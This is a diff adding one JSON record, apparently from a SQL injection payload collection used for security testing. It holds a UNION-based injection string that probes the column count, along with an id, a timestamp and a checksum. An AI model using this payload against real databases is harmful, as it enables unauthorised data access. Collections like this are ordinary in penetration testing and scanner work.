@@ -1,0 +1,7 @@
+{
+  "injection_vector": "sql_injection",
+  "payload_id": 8,
+  "created": "2025-09-18T21:17:00.232228",
+  "payload": "' UNION ALL SELECT null,null,null,null,null --",
+  "checksum": "5ab8aab42cfac4a7ef8ab48b64dc12d637fd25eaba4655da6e47432220f2aa68"
+}
